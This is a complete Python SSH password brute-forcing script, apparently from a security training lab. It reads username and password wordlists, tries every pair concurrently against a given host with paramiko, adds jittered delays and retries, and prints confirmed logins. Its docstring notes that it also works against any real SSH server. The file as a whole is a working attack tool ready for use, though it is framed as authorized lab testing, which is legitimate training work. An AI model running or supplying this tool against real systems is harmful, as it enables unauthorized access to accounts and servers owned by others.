#!/usr/bin/env python3
"""SSH credential tester for the Lab-in-a-Box ssh-lab target.

Attempts password auth for each username/password pair against an SSH
server and reports which pairs authenticate. Works against the lab's
placeholder paramiko server (ssh-lab/server.py) and any real SSH server
that authenticates via plain password auth.

This only ever attacks the host/port it is given.

Output contract (parsed by labctl/brute.py):
  * `[+] <user>:<password>`   for each confirmed login
  * `[*] attempts=N confirmed=N failures=N errors=N` summary line

Usage:
    python ssh_brute.py --host HOST --port PORT \
        --usernames FILE --passwords FILE [options]
"""
import argparse
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import paramiko


class SSHBruteForcer:
    def __init__(self, host, port, usernames_file, passwords_file,
                 threads=1, delay=0.5, timeout=10.0, retries=1):
        self.host = host
        self.port = port
        self.usernames_file = usernames_file
        self.passwords_file = passwords_file
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.retries = retries
        self.lock = threading.Lock()
        self.counters = {'attempts': 0, 'confirmed': 0, 'failures': 0, 'errors': 0}

    def read_wordlist(self, path):
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            return [line.strip() for line in f if line.strip()]

    def _count(self, key):
        with self.lock:
            self.counters[key] += 1

    def attempt(self, username, password):
        """Return (ok, user, password) where ok is True (login OK), False
        (auth failure), or None (transient error, retries exhausted)."""
        self._count('attempts')
        for n in range(1 + self.retries):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    self.host, port=self.port,
                    username=username, password=password,
                    timeout=self.timeout, banner_timeout=self.timeout,
                    auth_timeout=self.timeout, look_for_keys=False,
                    allow_agent=False,
                )
                self._count('confirmed')
                return True, username, password
            except paramiko.AuthenticationException:
                self._count('failures')
                return False, username, password
            except (paramiko.SSHException, OSError) as exc:
                if n == self.retries:
                    self._count('errors')
                    print(f"[!] {username}:{password}: {exc}")
                    return None, username, password
                time.sleep(min(0.5 * 2 ** n, 8))
                continue
            finally:
                client.close()
        return None, username, password

    def brute_force(self):
        found = []
        usernames = self.read_wordlist(self.usernames_file)
        passwords = self.read_wordlist(self.passwords_file)
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self.attempt, u, p): (u, p)
                       for u in usernames for p in passwords}
            for future in as_completed(futures):
                if self.delay:
                    time.sleep(self.delay * random.uniform(0.5, 1.5))
                ok, u, p = future.result()
                if ok:
                    found.append((u, p))
                    print(f"[+] {u}:{p}")
        return found

    def run(self):
        found = self.brute_force()
        with self.lock:
            c = self.counters
            print(f"[*] attempts={c['attempts']} confirmed={c['confirmed']} "
                  f"failures={c['failures']} errors={c['errors']}")
        print("Found credentials:" if found else "No successful logins found.")
        for u, p in found:
            print(f"  {u}:{p}")


def build_parser():
    parser = argparse.ArgumentParser(
        description='SSH credential tester (authorized testing only)')
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', type=int, default=22)
    parser.add_argument('--usernames', required=True)
    parser.add_argument('--passwords', required=True)
    parser.add_argument('--threads', type=int, default=1)
    parser.add_argument('--delay', type=float, default=0.5)
    parser.add_argument('--timeout', type=float, default=10.0)
    parser.add_argument('--retries', type=int, default=1)
    return parser


def parse_args(argv=None):
    return build_parser().parse_args(argv)


if __name__ == '__main__':
    a = parse_args()
    SSHBruteForcer(
        host=a.host, port=a.port,
        usernames_file=a.usernames, passwords_file=a.passwords,
        threads=a.threads, delay=a.delay, timeout=a.timeout, retries=a.retries,
    ).run()
